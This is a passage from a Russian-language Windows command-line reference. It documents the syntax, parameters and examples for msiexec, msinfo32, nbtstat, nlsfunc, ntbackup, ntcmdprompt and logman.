    Отображение основного пользовательского интерфейса без модальных диалоговых окон. 

Заметки
- Параметр /qb+- не является поддерживаемым уровнем пользовательского интерфейса. При отмене установки пользователем модальное окно не выводится. - Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

Для отображения основного пользовательского интерфейса в ходе установки пакета Example.msi введите:

msiexec /qb Example.msi

Вывод сведений об авторских правах для установщика Windows
Синтаксис

msiexec {/?|/h}
Параметры

{/?|/h}
    Отображение версии установщика Windows и сведений об авторских правах.

Заметки
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».

Вызов системной функции DllRegisterServer для регистрации модулей, указанных в командной строке
Синтаксис

msiexec /y модуль
Параметры

/y
    Вызов системной функции DllRegisterServer для регистрации модулей, указанных в командной строке
модуль
    Имя файла модуля.

Заметки
- Этот параметр используется только для данных из реестра, которые не могут быть добавлены с помощью таблиц реестра MSI-файла.- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

В следующем примере показано использование команды msiexec /y:

msiexec /y my_file.dll

Вызов системной функции DllRegisterServer для отмены регистрации модулей, указанных в командной строке
Синтаксис

msiexec /z модуль
Параметры

/z
    Вызов системной функции DllRegisterServer для отмены регистрации модулей, указанных в командной строке.
модуль
    Имя файла модуля.

Заметки
- Этот параметр используется только для данных из реестра, которые не могут быть добавлены с помощью таблиц реестра MSI-файла.- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

В следующем примере показано использование команды msiexec /z:

msiexec /z my_file.dll
========================================================================================
Msinfo32

Служит для отображения подробных сведений об оборудовании, системных компонентах и среде программного обеспечения.
Синтаксис

msinfo32 [/?] [/pch] [/nfo имя_файла] [/report имя_файла] [/computer имя_компьютера] [/showcategories] [/category код_категории] [/categories код_категории]
Параметры

имя_файла
    Файл, который требуется открыть. Файл может иметь расширение NFO, XML, TXT или CAB.
/?
    Отображение справки по команде msinfo32.
/pch
    Отображение журнала.
/nfo имя_файла
    Сохранение экспортированного файла как NFO-файла.
/report имя_файла
    Сохранение экспортированного файла как TXT-файла.
/computer имя_компьютера
    Открытие окна сведений о системе для указанного удаленного компьютера.
/showcategories
    Открытие окна сведений о системе, содержащего все доступные коды категорий.
/category код_категории
    Открытие окна сведений о системе, в котором выбрана указанная категория. Для отображения списка доступных кодов категорий служит параметр /showcategories
/categories код_категории
    Открытие окна сведений о системе, содержащего только указанные категории. Вывод также ограничивается только выбранными категориями. Для отображения списка доступных кодов категорий служит параметр /showcategories
/?
    Отображение справки в командной строке.

Заметки
- Некоторые категории сведений о системе содержат большие объемы данных. Скорость создания отчетов для этих категорий можно увеличить, используя команду start /wait. Для получения дополнительных сведений щелкните ссылку «».
Примеры

Чтобы получить список доступных кодов категорий, введите:

msinfo32 /showcategories

Чтобы открыть окно сведений о системе, содержащее все доступные сведения, кроме сведений о загруженных модулях, введите:

msinfo32 /categories +all -loadedmodules

Чтобы открыть окно сведений о системе и создать NFO-файл syssum.nfo, содержащий сведения категории «Сведения о системе», введите:

msinfo32 /nfo syssum.nfo /categories +systemsummary

Чтобы вывести сведения о конфликте ресурсов и создать NFO-файл conflicts.nfo, содержащий сведения о конфликтах ресурсов, введите:

msinfo32 /nfo conflicts.nfo /categories +componentsproblemdevices+resourcesconflicts+resourcesforcedhardware
========================================================================================
Nbtstat

Служит для отображения статистики протокола NetBIOS over TCP/IP (NetBT), таблиц имен NetBIOS для локального и удаленного компьютеров, а также кэша имен NetBIOS. Команда Nbtstat позволяет обновить кэш имен NetBIOS и имена, зарегистрированные в службе имен Интернета Windows (WINS). Запущенная без параметров, команда nbtstat выводит справку.
Синтаксис

nbtstat [-a удаленное_имя] [-A IP-адрес] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [интервал]
Параметры

-a удаленное_имя
    Отображение таблицы имен NetBIOS удаленного компьютера, где удаленное_имя является именем NetBIOS удаленного компьютера. Таблица имен NetBIOS является списком имен NetBIOS, соответствующих приложениям NetBIOS, работающим на данном компьютере.
-A IP-адрес
    Отображение таблицы имен NetBIOS удаленного компьютера, заданного IP-адресом (десятичные числа, разделенные точками).
-c
    Отображение содержимого кэша имен NetBIOS, таблицы имен NetBIOS и их разрешенных IP-адресов.
-n
    Отображение таблицы имен NetBIOS локального компьютера. Состояние Зарегистрирован означает, что это имя зарегистрировано на сервере WINS или в качестве широковещательного адреса.
-r
    Отображение статистики разрешения имен NetBIOS. На компьютере Windows XP, настроенном для использования WINS, этот параметр возвращает количество имен, разрешенных и зарегистрированных для широковещательной рассылки или WINS.
-R
    Очистка содержимого кэша имен NetBIOS и перезагрузка записей #PRE из файла Lmhosts.
-RR
    Освобождение и обновление имен NetBIOS для локального компьютера, зарегистрированного на серверах WINS.
-s
    Отображение сеансов клиента и сервера NetBIOS с попыткой преобразования конечного IP-адреса в имя.
-S
    Вывод сведений о работе сервера и клиента NetBIOS; удаленные компьютеры выводятся только по IP-адресам.
интервал
    Обновление выбранной статистики на экране через промежутки времени, заданные значением интервал. Нажатие клавиш CTRL+C останавливает обновление статистики. Если этот параметр не задан, команда nbtstat выводит сведения о текущей конфигурации один раз.
/?
    Отображение справки в командной строке.

Заметки
- При задании параметров команды nbtstat учитывается регистр символов. - В следующей таблице приведены заголовки столбцов, отображаемые программой nbtstat.
Заголовок     Описание
Ввод     Число полученных байт.
Вывод     Число отправленных байт.
Вид     Направление передачи от локального компьютера (Исх) или от удаленного компьютера (Вхд).
Время жизни     Время, оставшееся до сброса элемента кэша таблицы имен.
Локальное имя     Локальное имя NetBIOS, соответствующее данному подключению.
Удаленный узел     Имя или IP-адрес удаленного компьютера.
<03>     Последний байт имени NetBIOS, преобразованный в шестнадцатеричную форму. Каждое имя NetBIOS может иметь длину 16 знаков. Последний байт часто имеет специальное значение, так как одно имя может встречаться несколько раз на одном компьютере, различаясь только последним байтом. Например, код <20> представляет собой пробел.
Тип     Тим имени. Имя может быть уникальным именем или именем группы.
Состояние     «Зарегистрирован» (служба NetBIOS работает на удаленном компьютере) или «Конфликт» (в службе уже зарегистрировано такое же имя компьютера).
Состояние     Состояние подключений NetBIOS.
- В следующей таблице приведены возможные состояния подключения NetBIOS.
Состояние     Описание
Подключен     Сеансовое подключение установлено.
Назначен     Конечная точка подключения создана и связана с IP-адресом.
Ожидание     Конечная точка доступна для входящих подключений.
Простаивает     Конечная точка создана, но подключение не получено.
Подключается     Сеанс в состоянии подключения, сопоставление имени и IP адреса для точки назначения определено.
Прием     Запрос на входящее подключение принят, подключение будет установлено.
Повторное подключение     Повторная попытка установки подключения (после первой неудачной попытки).
Исходящий     Сеанс находится в процессе подключения, создается подключение TCP.
Входящий     Сеанс находится в процессе подключения.
Отключение     Сеанс находится в процессе отключения.
Отключен     Локальный компьютер отправил запрос на отключение и ожидает подтверждения от удаленной системы.
- Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы вывести таблицу имен удаленного компьютера, имеющего имя NetBIOS CORP07, введите:

nbtstat -a CORP07

Чтобы вывести таблицу имен NetBIOS удаленного компьютера, имеющего IP-адрес 10.0.0.99, введите:

nbtstat -A 10.0.0.99

Чтобы вывести таблицу имен локального компьютера, введите:

nbtstat -n

Чтобы вывести содержимое кэша имен NetBIOS локального компьютера, введите:

nbtstat -c

Чтобы очистить кэш имен NetBIOS и перезагрузить записи #PRE из локального файла Lmhosts, введите:

nbtstat -R

Чтобы освободить имена NetBIOS, зарегистрированные на сервере WINS, и снова зарегистрировать их, введите:

nbtstat -RR

Чтобы просмотреть статистику сеанса NetBIOS по IP-адресу с обновлением каждые пять секунд, введите:

nbtstat -S 5
========================================================================================
Nlsfunc

Загрузка данных для конкретной страны/области.
Синтаксис

nlsfunc [[диск:][путь][имя_файла]]
Параметры

[[диск:][путь][имя_файла]]
    Указание файла, содержащего данные для конкретной страны/области.
/?
    Отображение справки в командной строке.

Примечания
- 
========================================================================================
Ntbackup

Архивация может выполняться из командной строки или пакетного файла с помощью команды ntbackup и различных параметров командной строки.
Синтаксис

ntbackup backup [systemstate] "@имя_файла_bks" /J {"имя_задания"} [/P {"имя_пула"}] [/G {"идентификатор_guid"}] [/T { "имя_ленты"}] [/N {"носитель"}] [/F {"имя_файла"}] [/D {"описание"}] [/DS {"имя_сервера"}] [/IS {"имя_сервера"}] [/A] [/V:{yes|no}] [/R:{yes|no}] [/L:{f|s|n}] [/M {тип_архива}] [/RS:{yes|no}] [/HC:{on|off}] [/SNAP:{on|off}]
Параметры

systemstate
    Указывает, что следует выполнить архивацию данных о состоянии системы. При выборе данного параметра будет установлен обычный или копирующий тип архивации.
@имя_ bks_файла
    Указывает имя файла (с расширением bks) со списком файлов для архивации в данном задании архивации. Перед именем файла должен стоять символ @. Этот файл содержит сведения о файлах и папках, подлежащих архивации. Этот файл должен быть создан с помощью программы архивации с графическим интерфейсом.
/J {"имя_задания"}
    Указывает имя задания, которое будет упоминаться в файле журнала. Обычно имя задания описывает файлы и папки, подлежащие архивации в данном задании архивации, а также содержит дату и время архивации.
/P {"название_пула"}
    Указывает пул носителей, носитель из которого будет использован. Обычно это подпул пула носителей архивации, такой как 4-мм DDS. Если этот подпул был выбран, невозможно использовать параметры командной строки /A, /G, /F или /T.
/G {"идентификатор_guid"}
    Добавляет или заменяет данные на ленте. Не следует использовать этот параметр совместно с параметром /P.
/T {"имя_ленты"}
    Добавляет или заменяет данные на ленте. Не следует использовать этот параметр совместно с параметром /P.
/N {"носитель"}
    Указывает новое имя ленты. Не следует использовать параметр /A совместно с этим параметром.
/F {"имя_файла"}
    Путь и имя файла на логическом диске. Совместно с этим параметром не следует использовать следующие параметры: /P /G /T.
/D {"описание"}
    Указывает метку для каждого архива.
/DS {"имя_сервера"}
    Производит архивацию файла службы каталогов указанного сервера Microsoft Exchange.
/IS {"имя_сервера"}
    Производит архивацию файла банка сообщений указанного сервера Microsoft Exchange.
/A
    Производит архивацию с добавлением в архив. Совместно с этим параметром следует использовать параметр /G или /T. Не следует использовать этот параметр совместно с параметром /P.
/V:{yes|no}
    Проверяет данные после архивации.
/R:{yes|no}
    Ограничивает доступ к этой ленте одним владельцем или членами группы «Администраторы».
/L:{f|s|n}
    Указывает тип файла журнала: f=полный, s=сокращенный, n=нет (файл журнала не создается).
/M {тип_архива}
    Указывает тип архива. Этот параметр должен иметь одно из следующих значений: normal, copy, differential, incremental или daily.
/RS:{yes|no}
    Производит архивацию перемещенных данных на съемных носителях. Параметр командной строки /RS не требуется для архивации локальной базы данных съемных носителей (эта база данных содержит заместители мест файлов удаленного хранилища). При архивации папки %systemroot% программа архивации автоматически архивирует и базу данных съемных носителей. 
/HC:{on|off}
    Использует при возможности аппаратное сжатие.
/SNAP:{on|off}
    Указывает, является (on) или не является (off) архив снимком состояния тома.
/M {тип_архива}
    Указывает тип архива. Этот параметр должен иметь одно из следующих значений: normal, copy, differential, incremental или daily.
/?
    Отображает справку в командной строке.

Замечания
- Восстановление файлов из командной строки с помощью команды ntbackup невозможно. - Если следующие параметры командной строки не заданы, будут использованы соответствующие настройки программы архивации с графическим интерфейсом: /V /R /L /M /RS /HC. Например, если в диалоговом окне Параметры программы архивации включено сжатие при архивации, при отсутствии параметра /HC в командной строке данные будут сжиматься. Но если в командной строке задан параметр /HC:off, он заменяет значение параметра диалогового окна Параметры, и сжатие не используется.- Если на данном компьютере запущены службы мультимедиа Windows и требуется выполнить архивацию файлов этих служб, ознакомьтесь с разделом о выполнении архивации служб Windows Media электронной документации по службам Windows Media. Для архивации или восстановления файлов служб Windows Media следуйте инструкциям, приведенным в электронной документации по службам Windows Media. - Архивация данных о состоянии системы возможна только для локального компьютера. Нельзя архивировать данные о состоянии системы для удаленного компьютера.- Если управление носителями осуществляется службой «Съемные ЗУ» или для сохранения данных используется внешнее хранилище, следует регулярно архивировать файлы, находящиеся в следующих папках:

системный_корневой_каталог\System32\Ntmsdata

системный_корневой_каталог\System32\Remotestorage

Это будет гарантировать возможность восстановления всех данных, сохраненных во внешнем хранилище и на съемном ЗУ.
Примеры
Пример 1

В этом примере создается обычный архив — «Задание 1» удаленного общего ресурса \\iggy-multi\c$. Для этого ленте из пула носителей «Backup» присваивается имя «Созданный из командной строки архив 1». Заданию архивации также будет дано описание «Архивация из командной строки». Архив будет проверен сразу после завершения архивации, доступ к нему будет предоставляться не только владельцу/администратору, будет вестись сокращенный журнал, архивация данных из внешнего хранилища выполняться не будет, а аппаратное сжатие будет включено.

ntbackup backup \\iggy-multi\c$ /m normal /j "Задание 1" /p "Backup" /n "Созданный из командной строки архив 1" /d "Архивация из командной строки" /v:yes /r:no /l:s /rs:no /hc:on
Пример 2

В этом примере создается копирующий архив — «Задание 2» локального диска D:\. Архивируемые файлы и папки будут добавлены на ленту «Созданный из командной строки архив 1». Все другие параметры будут взяты из настроек программы архивации.

ntbackup backup d:\ /j "Задание 2" /a /t "Созданный из командной строки архив 1" /m copy
Пример 3

В этом примере создается архив того типа, который указан в программе архивации. При этом будет использован файл со списком файлов для архивации Commandline.bks, расположенный в папке C:\Program Files\Windows NT\ntbackup\data\. Задание архивации будет названо «Задание 3», а название ленты «Созданный из командной строки архив 1» будет заменено на «Созданный из командной строки архив 2».

ntbackup backup "@C:\Program Files\Windows NT\ntbackup\data\commandline.bks" /j "Задание 3" /t "Созданный из командной строки архив 1" /n "Созданный из командной строки архив 2"
Пример 4

Следующие примеры иллюстрируют выполнение архивации из командной строки. Все три примера используют тип архива, параметры проверки, уровень ведения журнала, аппаратное сжатие и другие параметры, заданные в программе архивации. В первом примере выполняется архивация ресурса \\iggy-multi\d$ в файл D:\Backup.bkf. Во втором примере архивация тех же данных в этот же файл. В третьем примере имеющийся архив заменяется новым архивом, содержащим те же данные. Во всех трех примерах букву диска можно заменить полным именем UNC (то есть, вместо файла архива d:\backup.bkf можно задать файл \\iggy-multi\d$\backup.bkf).

ntbackup backup \\iggy-multi\d$ /j "Созданный из командной строки архив 4" /f "D:\backup.bkf"

ntbackup backup \\iggy-multi\d$ /j "Созданный из командной строки архив 5" /f "D:\backup.bkf" /a

ntbackup backup \\iggy-multi\d$ /j "Созданный из командной строки архив 6" /f "D:\backup.bkf"
========================================================================================
Ntcmdprompt

Запуск командного интерпретатора Cmd.exe, а не интерпретатора Command.com после запуска резидентной программы (TSR) или после временного выхода из приложения MS-DOS.
Синтаксис

ntcmdprompt
Параметры

/?
    Отображает справку в командной строке.

Замечания
-При работе с Command.com некоторые возможности интерпретатора команд Cmd.exe, такие как отображение списка использованных команд с помощью параметра doskey, не поддерживаются. Если необходимо вызывать командный интерпретатор Cmd.exe после загрузки резидентных программ или из приложения MS-DOS, следует использовать команду ntcmdprompt. Однако, во время работы Cmd.exe резидентная программа может быть недоступна. Команду ntcmdprompt можно поместить в файл Config.nt или в соответствующий ему специальный файл настройки приложения (PIF).
Примеры

Чтобы включить команду ntcmdprompt в файл Config.nt или в другой загрузочный файл, заданный в файле PIF, введите следующее.

ntcmdprompt
========================================================================================
Logman

Управляет и задает расписания для счетчиков производительности и журнала трассировки событий на локальном или удаленных компьютерах.
Синтаксис действий

Logman [create {counter | trace} имя_выборки ] [start имя_выборки] [stop имя_выборки] [delete имя_выборки] [query {имя_выборки|providers}] [update имя_выборки]
Параметры

create {counter | trace} имя_выборки
    Создает запросы на выборку данных для счетчика или трассировки. Имеется возможность использовать командную строку для указания параметров.
start collection_name
    Производит запуск запроса имя_выборки на выборку данных. Этот параметр применяется для перехода к сбору данных вручную вместо сбора по расписанию. Для восстановления режима сбора данных по расписанию используйте параметр update с ключами времени начала (–b), окончания (–e) или повтора (–rt).
stop имя_выборки
    Производит остановку запроса имя_выборки на выборку данных. Этот параметр применяется для перехода к сбору данных вручную вместо сбора по расписанию. Для восстановления режима сбора данных по расписанию используйте параметр update с ключами времени начала (–b), окончания (–e) или повтора (–rt).
delete имя_выборки
    Удаляет запрос имя_выборки на выборку данных. Если запрос имя_выборки не существует, появится сообщение об ошибке.
query {имя_выборки|providers}
    Если не задан аргумент имя_выборки или providers, отображается состояние всех существующих запросов на выборку данных. Используйте аргумент имя_выборки для отображения свойств конкретной выборки. Чтобы отобразить свойства на удаленных компьютерах, в командной строке введите: -s удаленный_компьютер. Аргумент providers может использоваться в качестве ключевого слова вместо аргумента имя_выборки для отображения зарегистрированных поставщиков, установленных на локальном компьютере. Чтобы перечислить зарегистрированных поставщиков на удаленном компьютере используйте ключ -s в командной строке.
update имя_выборки
    Производит обновление запросов для счетчика и для выборок данных трассировки. После изменения параметров выборку данных счетчика необходимо перезапустить. Для выборок данных трассировки используйте в командной строке следующие параметры, чтобы сделать запрос, не прекращая выборку: -p поставщик [(флаги[,флаги ...])] уровень, - max n, - o путь, -ft мм:сс, или -fd.

Синтаксис модификаторов

[-s имя_компьютера] [-config имя_файла] [-b М/д/гггг ч:мм:сс[AM | PM]] [-e М/д/гггг ч:мм:сс[AM | PM]] [-m [start] [stop]] [-[-]r] [-o {путь | DSN!журнал_счетчиков}] [-f {bin | bincirc | csv | tsv | SQL}] [-[-]a] [-[-]v [{nnnnn | ммддччмм}]] [-[-] rc [имя_файла]] [-[-] max {значение}] [-[-]cnf [[[чч:]]мм:]сс] [-c {путь [путь ...] | -cf имя_файла}] [-si [[чч:]мм:]сс] [-ln имя_сеанса] [-ets] [-[-] rt] [-p {GUID | поставщик [(флаги [,флаги...]}] уровень | -pf имя_файла}] [-[-] ul] [-bs значение] [-ft [[чч:]мм:]сс] [-nb мин макс] [-fd имя_сеанса] [-[-]u пароль_пользователя] [-rf [[чч:]мм:]сс] [-y] [-mode {режим_трассировки [режим трассировки ...]}]
Параметры

-s имя_компьютера
    Указывает, что команды создания, запуска, остановки, удаления, запроса или обновления будут выполнятся на удаленном компьютере. По умолчанию используется локальный компьютер.
-config имя_файла
    Задает путь к файлу, содержащему параметры командной строки.
-b М/д/гггг ч:мм:сс[AM | PM]
    Указывает время (в 24-часовом формате) начала записи выборки данных. Можно задать время в 12-часовом формате, добавив в командную строку параметр AM или PM. По умолчанию используются текущие день и время, если не заданы другие данные. Чтобы немедленно начать выборку, воспользуйтесь возможностью запуска вручную.
-e М/д/гггг ч:мм:сс[AM | PM]
    Указывает время (в 24-часовом формате) завершения записи выборки данных. Можно задать время в 12-часовом формате, добавив в командную строку параметр AM или PM. По умолчанию используются текущие день и время, если не заданы другие данные. Используйте остановку вручную, а затем параметр повтора, чтобы установить значение времени завершения меньше значения текущего времени, иначе будет выдано сообщение об ошибке.
-m start stop
    Определяет, что выборки будут запускаться и останавливаться вручную в командной строке с помощью параметров start и stop. Невозможно вместе использовать параметры -m start и -b или -m stop и -e или -rf в одном запросе.
-r
    Производит повторную запись выборки данных каждый день в течение интервала времени, задаваемом параметрами -b и -rf или параметрами –b и –e. Эта команда действительна только для интервалов, время начала и окончания которых приходится на один и тот же день, месяц и год.
--r
    Выключает параметр повторения записи.
-o {путь | DSN!журнал_счетчиков}
    Указывает путь к файлу, в котором записываются данные счетчиков производительности или данные трассировки, или местоположение базы и набора данных SQL. Чтобы база данных SQL использовала формат «DNS!журнал_счетчиков», введите в командной строке ключ -f. По умолчанию в качестве имени файла журнала используется имя выборки с расширением .blg для счетчиков производительности или .etl для данных трассировки.
-f {bin | bincirc | csv | tsv | SQL}
    Указывает формат файла, используемый для сбора данных счетчиков производительности и данных трассировки. Для журнала может быть выбран один из следующих форматов: двоичный, циклический двоичный, текст с разделителями-запятыми и текст с разделителями-знаками табуляции, а также формат базы данных SQL. С параметром «DNS!;журнал_счетчиков» следует использовать в командной строке ключ -o. Для форматов базы данных SQL должно быть заранее определено имя источника данных (DSN), а пользователь должен иметь право записи в эту базу данных. Набор данных журнал_счетчиков создается в базе данных и определяется DSN. По умолчанию используется двоичный формат.
-a
    Этот параметр используется для записи в конец файла.
--a
    Выключает режим записи в конец и возвращает систему к режиму перезаписи.
-v {nnnnn | ммддччмм}
    Добавляет данные контроля версий в конец выходного файла и пути. Используйте для контроля версий числовой формат nnnnn или формат даты ммддччмм, включающий месяц, день, час (в 24-часовой нотации) и минуты.
--v
    Выключает параметр добавления данных контроля версий.
-rc имя_файла
    Запускает эту команду после после того, как файл был закрыт при достижении его конца или во время выборки. Чтобы закрывать файлы во время выборки, используйте ключ -rf совместно с ключом -cnf. Использование ключа -stop отключит этот режим. Команды всегда выполняются в активном режиме.
--rc
    Выключает режим закрытия файлов во время выборки.
-max значение
    Указывает максимальный размер файла журнала в мегабайтах. Если размер журнала превышает максимальный, накопление данных прекращается. Для базы данных SQL максимальный размер представляет максимальное число записей.
--max
    Выключает ограничение на размер журнала. Этот параметр используется по умолчанию.
-cnf [[чч:]мм:]сс
    Создает новый файл, когда файлы для хранения выходной информации превышают максимально допустимый размер или когда истекает указанное время. Необходимо включить ключ -v при выполнении этой команды. По умолчанию создается только один файл журнала для каждой выборки.
--cnf
    Выключает параметр создания нового файла журнала.
-c {путь [путь...] | -cf имя_файла}
    Указывает путь к журналу для счетчика производительности или путь и имя файла журнала, в котором содержится список этих счетчиков. Чтобы задать несколько путей счетчиков, используйте пробел для разделения командной строки или параметр -cf, чтобы ввести список путей счетчиков из входного файла (по одному в строке).

    Общий формат для путей счетчиков выглядит следующим образом: [\\компьютер]\объект[родительский_объект/экземпляр#индекс]\счетчик], где:

    Компоненты «родительский_объект», «экземпляр», «индекс» и «счетчик» могут содержать допустимое имя или подстановочный знак. Компоненты «компьютер», «родительский_объект», «экземпляр» и «индекс» не являются необходимыми для всех счетчиков.

    Путь к счетчику определяется для каждого счетчика отдельно. Например, объект логический_диск имеет индекс экземпляра, поэтому для него необходимо задать значение #индекс или ввести подстановочный знак. Таким образом, можно использовать следующий формат.

    \логический_диск(*/*#*)\*

    Для объекта процесс не требуется задавать индекс экземпляра. Таким образом, можно использовать следующий формат.

    \процесс(*)\идентификатор_процесса

    Ниже приведен список допустимых форматов.
    - \\компьютер\объект(родительский_объект/экземпляр#индекс)\счетчик- \\компьютер\объект(родительский_объект/экземпляр)\счетчик- \\компьютер\объект(экземпляр#индекс)\счетчик- \\компьютер\объект(экземпляр)\счетчик- \\компьютер\объект\счетчик- \объект(родительский_объект/экземпляр#индекс)\счетчик- \объект(родительский_объект/экземпляр)\счетчик- \объект(экземпляр#индекс)\счетчик- \объект(экземпляр)\счетчик- \объект\счетчик

    Если подстановочный знак используется в имени родительского объекта, будут возвращены все экземпляры указанного объекта, соответствующие заданным полям «экземпляр» и «счетчик».

    Если подстановочный знак используется в имени экземпляра, будут возвращены все экземпляры указанного объекта и родительского объекта, если имена всех экземпляров, соответствующих указанному индексу, соответствуют подстановочному знаку.

    Если подстановочный знак используется в имени счетчика, будут возвращены все счетчики указанного объекта.

    Частичное совпадение пути счетчика (например «pro*») не поддерживается.
-si [[чч:]мм:]сс
    Указывает интервал обновления для выборки данных счетчиков в часах, минутах и секундах По умолчанию этот интервал составляет 15 секунд.
-ln имя_сеанса
    Указывает имя, определенное пользователем, для сеанса трассировки событий. По умолчанию в качестве имени сеанса используется имя выборки.
-ets
    Создает и запускает сеанс трассировки событий с помощью параметров, определенных в командной строке. Имеется возможность использовать этот дополнительный параметр вместе с действиями create trace, update, query и delete.
-rt
    Указывает, что сеанс трассировки событий выполняется в режиме реального времени и не записывается в журнал. По умолчанию данные записываются в журнал. 
--rt
    Выключает параметр работы в режиме реального времени. 
-p {GUID | поставщик [(флаги[,флаги ...])] уровень] | -pf {имя_файла}
    Указывает поставщиков (выборщиков данных трассировки), которых можно использовать для накопления данных трассировки. Используйте поставщиков запросов logman, чтобы найти параметр pname (поставщики с именем) в списке зарегистрированных поставщиков. Чтобы перечислить нескольких поставщиков, используйте ключ -pf. Ключ -pf определяет входной файл, содержащий имена поставщиков. Имена поставщиков заключаются в кавычки ("") или в коды GUID в фигурных скобках, маски флагов и целые числа (уровень разрешения). Флаги используются или в шестнадцатеричном (OXFFFF) формате или в формате (флаг, флаг).
-ul
    Указывает, что сеанс трассировки событий выполняется в пользовательском режиме. При использовании ключа -ul только один поставщик может быть включен для сеанса трассировки событий.
--ul
    Отключает пользовательский режим, и сеанс трассировки событий выполняется в режиме ядра.
-bs значение
    Указывает размер буфера (в килобайтах) для выборок данных трассировки.
-ft [[чч:]мм:]сс
    Указывает интервал таймера сброса (в минутах и секундах) для выборок данных трассировки.
-nb мин макс
    Указывает минимальное и максимальное число буферов для выборки данных трассировки. Минимальное значение по умолчанию равно числу процессоров системы плюс два. Максимальное значение по умолчанию равно 25.
-fd имя_сеанса
    Сбрасывает все активные буферы существующего сеанса трассировки событий на диск. Используйте эту команду вместе с ключом -ln.
-u пароль_пользователя
    Указывает имя учетной записи и пароль, которые используются запросом на выборку данных на локальном и удаленных компьютерах. Чтобы начать сбор данных по запросам на выборку данных, откройте оснастку «Оповещения и журналы производительности» для удаленного компьютера. Можно использовать символ * в качестве пароля в командной строке, чтобы было предложено ввести пароль.
--u
    Восстанавливает имя учетной записи в службе «Оповещения и журналы производительности».
-rf [[чч:]мм:]сс
    Указывает, что выборки выполняются за установленный период времени.
-y
    Перезаписывает параметры имени выборки, а затем применяет новые параметры без запроса конечного пользователя.
-mode {режим_трассировки [режим_трассировки ...]}
    Указывает дополнительные параметры только тех для сеансов трассировки, у которых режим_трассировки может иметь значения globalsequence, localsequence или pagedmemory. При работе в режиме globalsequence трассировщик событий добавляет последовательный номер каждому получаемому событию, не зависимо от того, в каком сеансе трассировки было получено событие. При работе в режиме localsequence трассировщик событий добавляет последовательный номер событиям из определенного сеанса трассировки. При использовании режима localsequence последовательные номера могут повторятся от сеанса к сеансу, но внутри одного сеанса все номера уникальны. При работе в режиме pagedmemory трассировщик событий использует для внутренних выделений буфера выгружаемую память, а не определенный по умолчанию невыгружаемый пул.
/?
    Отображает справку в командной строке.

Примечания
- Ниже перечислены допустимые параметры для действий командной строки create, update, start, stop, delete и query.

-s имя_удаленного_компьютера

-[-]u домен/пароль_пользователя
- Ниже перечислены допустимые параметры для действий create и update и общие ключи для аргументов счетчик и трассировка.

-y

-b М/д/гггг ч:мм:сс [AM|PM]

-e М/д/гггг ч:мм:сс [AM|PM]

-rf чч:мм:сс

-m start stop

-f bin|bincirc

-[-]r

-o путь

-[-]a

-[-]v nnnnn|ммддччмм

-[-]rc команда путь

-[-]max n

-[-]cnf чч:мм:сс
- Для аргумента счетчики существует всего два общих параметра:

-f bin|bincirc|csv|tsv|SQL

-o путь | DSN!журнал_счетчиков
- Для действия create счетчик существует всего два общих параметра:

-c путь_счетчика | -cf входной_файл

-si [[чч:]мм:]сс

Этот параметры обновляют счетчик, останавливают и запускают выборки.
- Ниже перечислены параметры выборки данных трассировки для действия update.

- max n

- o путь

-ft мм:сс

-fd

Эти параметры осуществляют запрос на выборку данных трассировки, не прекращая выборки.
- Для аргумента счетчики существует всего два допустимых параметра:

-f bin|bincirc|csv|tsv|SQL

-o путь | DSN!журнал_счетчиков
- Для действия create счетчик существует всего две допустимых команды:

путь_счетчика | -cf входной_файл

-si чч:мм:сс
- Ниже перечислены допустимые команды для действия create трассировка.

-ln имя_сеанса

-[-]rt

-p Guid | поставщик (флаги[,флаги ...]) уровень | -pf имя_файла

-[-]ul

-bs n

-ft мм:сс

-nb мин макс

-fd имя_сеанса

-ets
- Использование параметра -config

Содержимое файла настроек, используемого с параметром -config, должно иметь следующий формат:

[параметр_команды]

значение
где параметр_команды — параметр командной строки, а значение — его значение. Например:

[create]

counter logx

[-s]

mysystem

[-u]

mypassword
- Использование параметра -mode

Этот параметр следует использовать только опытным пользователям.
-

Управление системным монитором

Можно использовать команду Logman для управления системами Windows 2000 и Windows XP.
-

Дополнительные сведения о включении команды Logman в сценарии инструментария управления Windows см. ссылку Scripting Logs and Monitoring на веб-узле Microsoft Windows Resource Kits.(http://www.microsoft.com/)
Примеры

Форматы данных в следующих примерах используются только с местным временем США.

Чтобы создавать ежедневные запросы на выборку данных счетчика с указанием времени начала и окончания, повторных выборок, номеров контроля версий, путей счетчиков и интервалов обновления, введите следующее.

Logman create counter daily_perf_log -b 7/27/2000 13:00:00 -e 7/27/2000 15:00:00 -r -v mmddhhmm -c "\Processor(_Total)\% Processor Time" "\Memory\Available bytes" -si 00:15 -o "c:\perflogs\daily_log"

Чтобы создавать ежедневные запросы на выборку данных с указанием времени начала и окончания, выборок выходных файлов, повторных выборок, номеров контроля версий, путей счетчиков и интервалов обновления, введите следующее.

Logman create counter daily_perf_log -b 7/27/2000 13:00:00 -e 7/27/2000 15:00:00 -r -o "c:\perflogs\daily_log" -v mmddhhmm -c "\Processor(_Total)\% Processor Time" "\Memory\Available bytes" -si 00:15

Чтобы создавать ежедневные запросы на выборку данных с помощью файла config, а не файла командной строки, введите следующее.

Logman -config file daily_perf.txt

Чтобы создавать ежедневные запросы на выборку данных трассировки с указанием времени начала и окончания, повторных выборок, номеров контроля версий, имен поставщиков, выборок входных и выходных файлов, введите следующее.

Logman create trace daily_kernel_trace_log -b 7/27/2000 13:00:00 -e 7/27/2000 15:00:00 -r -v mmddhhmm -p "Windows Kernel Trace" 0xFFFFFFFF -rf 100 -o "c:\perflogs\daily_nt_trace"

Чтобы создавать ежедневные запросы на выборку данных трассировки с указанием времени начала и окончания, повторных выборок, имен Guid и сеансов, выборок входных и выходных файлов, введите следующее.

Logman create trace daily_lsass_trace_log -b 7/27/2000 13:00:00 -e 7/27/2000 15:00:00 -r -v mmddhhmm -p "Local Security Authority(LSA) " 0x00000001 -rf 30:00 -o " c:\perflogs\daily_lsass_trace"

